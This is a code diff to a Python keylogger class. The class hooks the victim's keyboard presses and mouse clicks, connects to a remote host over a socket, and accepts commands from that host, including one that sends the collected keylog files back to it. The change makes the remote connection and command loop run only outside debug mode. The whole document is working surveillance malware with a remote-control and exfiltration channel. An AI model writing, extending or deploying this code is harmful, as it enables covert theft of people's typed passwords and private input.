@@ -57,27 +57,30 @@ class Keylogger:
         self.sock.send(bytes("data", 'ascii'))
 
     def start(self):
-        self.connect_to_host()
-
+        if not __debug__:
+            self.connect_to_host()
+        
         keyboard.on_press(callback=self.keyboard_callback)
         mouse.on_click(callback=self.mouse_callback)
         self.report()
         
-        #keyboard.wait()
-        while True:
-            recv = self.sock.recv(1024)
-            if recv:
-                recv = str(recv)[2:-1]
+        if __debug__:
+            keyboard.wait()
+        else:
+            while True:
+                recv = self.sock.recv(1024)
+                if recv:
+                    recv = str(recv)[2:-1]
 
-                if recv == "exit":
-                    self.sock.send(bytes("terminating", 'ascii'))
-                    self.sock.close()
-                    break
-                elif recv == "send":
-                    self.send_keylog_files_to_host()
-                else:
-                    self.sock.send(bytes("received", 'ascii'))
-                    print(recv)
+                    if recv == "exit":
+                        self.sock.send(bytes("terminating", 'ascii'))
+                        self.sock.close()
+                        break
+                    elif recv == "send":
+                        self.send_keylog_files_to_host()
+                    else:
+                        self.sock.send(bytes("received", 'ascii'))
+                        print(recv)
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=5)
